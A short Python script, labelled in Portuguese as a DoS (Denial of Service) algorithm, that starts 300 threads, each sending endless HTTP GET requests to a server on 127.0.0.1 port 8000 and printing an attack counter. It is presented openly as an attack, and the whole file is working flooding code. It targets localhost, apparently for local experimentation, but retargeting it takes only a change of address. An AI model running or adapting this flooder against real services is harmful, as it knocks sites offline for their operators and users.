import socket
import threading
print("============================================================================================================================")
print("==== ALGORITMO PARA DoS(Denial Of Service - Negação De Serviço) ====")
print("============================================================================================================================")

ataque_num = 0

def attack():
    while True:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect(('127.0.0.1', 8000))
      s.send(b'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r')
      resp = s.recv(4096)
      global ataque_num
      ataque_num+=1
      print('Attack number', ataque_num)
for i in range(300):
    thread = threading.Thread(target=attack)
    thread.start()
